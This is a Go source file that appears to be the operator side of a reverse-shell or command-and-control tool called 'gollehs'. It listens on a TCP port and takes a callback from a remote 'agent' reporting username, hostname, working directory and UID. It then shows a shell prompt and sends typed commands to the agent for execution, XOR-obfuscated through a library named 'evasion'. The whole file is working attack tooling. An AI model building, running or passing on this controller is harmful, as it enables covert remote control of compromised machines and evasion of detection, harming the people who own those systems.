package main

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/fatih/color"
	"github.com/s-christian/gollehs/lib/evasion"
	"github.com/s-christian/gollehs/lib/logger"
	"github.com/s-christian/gollehs/lib/utils"
	"github.com/s-christian/gollehs/types"
	//"github.com/google/uuid"
)

const (
	KeywordExit string = "EXIT"

	ExitSuccess int = 0
)

var (
	localIp, _  = net.ResolveIPAddr("ip4", "127.0.0.1")
	localPort   = "8000"
	localTcp, _ = net.ResolveTCPAddr("tcp", fmt.Sprintf("%s:%s", localIp.IP.String(), localPort))

	statusError   = color.New(color.BgRed, color.FgBlack, color.BlinkRapid)
	statusWarning = color.New(color.BgYellow, color.FgBlack, color.Bold)
	statusDone    = color.New(color.BgGreen, color.FgHiWhite, color.Italic)
)

func main() {
	listener, err := net.ListenTCP("tcp", localTcp)
	if err != nil {
		logger.LogError(err)
		return
	}

	logger.Logf(logger.Info, "Server listening on %s\n", listener.Addr().String())

	// for {
	conn, err := listener.AcceptTCP()
	if err != nil {
		logger.Logf(logger.Error, "Listener could not accept connection on %s\n", listener.Addr().String())
		logger.LogError(err)
		// continue
	}
	handleConnection(conn) // intentionally no concurrency (yet)
	// }
}

func handleConnection(conn *net.TCPConn) {
	defer func() {
		utils.Close(conn)
		logger.Logf(logger.Warning, "Connection from %s closed\n", conn.RemoteAddr().String())
	}()

	logger.Logf(logger.List, "Connection from %s\n", conn.RemoteAddr().String())

	// Get initial callback info
	decoder := gob.NewDecoder(conn)
	agentCallback := &types.AgentCallback{}
	err := decoder.Decode(agentCallback)
	if err != nil {
		statusWarning.Printf("WARNING: Could not decode agent data | %s\n", err.Error())
	}

	fmt.Println()
	agentCallback.PrintTable()
	fmt.Println()

	// Catch CTRL+C
	c := make(chan os.Signal, 1)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		// Catch every interrupt, not just the first one
		for {
			<-c // blocks until c has something in it, then drains it
			_catchInterrupt(agentCallback)
		}
	}()
	defer signal.Stop(c)

	for {
		userInput, err := getUserInput(agentCallback)
		if err != nil {
			statusError.Printf("ERROR: Could not get user input | %s\n", err.Error())
			continue
		}
		if len(userInput) == 0 {
			statusWarning.Printf("WARNING: EOF received, no input\n")
			continue
		}

		// Handle keyword commands
		switch userInput {
		case KeywordExit:
			return
		}

		encryptedInput := evasion.XorEncryptDecryptBytes([]byte(userInput))

		// Send commands through connection for agent to execute
		conn.SetWriteDeadline(time.Now().Add(2 * time.Second))
		bytesSent, err := conn.Write(encryptedInput)
		if err != nil {
			statusError.Printf("ERROR: Could not send command to agent! | %s\n", err.Error())
			return
		}

		if bytesSent < len(encryptedInput) {
			statusError.Printf("ERROR: Only sent %d of %d bytes to agent!\n", bytesSent, len(encryptedInput))
			continue
		}
	}
}

/*
	Get command line input from the user.
*/
func getUserInput(agentCallback *types.AgentCallback) (string, error) {
	scanner := bufio.NewScanner(os.Stdin)

	_printPrompt(agentCallback)

	for scanner.Scan() {
		if err := scanner.Err(); err != nil {
			return "", err
		}

		input := strings.TrimSpace(scanner.Text())

		if len(input) != 0 {
			return input, nil
		}

		_printPrompt(agentCallback)
	}

	return "", nil
}

/*
	Print the command line prompt.

	"user@hostname:~/Documents/Projects/Go/gollehs$ "
*/
func _printPrompt(agentCallback *types.AgentCallback) {
	userColor := color.New(color.FgWhite, color.Bold)
	spacerColor := color.New(color.FgHiBlack)
	cwdColor := color.New(color.FgGreen, color.Italic)

	userColor.Print(agentCallback.Username)
	spacerColor.Print("@")
	userColor.Print(agentCallback.Hostname)
	spacerColor.Print(":")
	cwdColor.Print(agentCallback.Cwd)

	// Root or non-root prompt symbols
	if agentCallback.UID == "0" {
		fmt.Print("# ")
	} else {
		fmt.Print("$ ")
	}
}

func _catchInterrupt(agentCallback *types.AgentCallback) {
	fmt.Println()
	statusWarning.Printf("Type %s to exit\n", KeywordExit)
	_printPrompt(agentCallback)
}
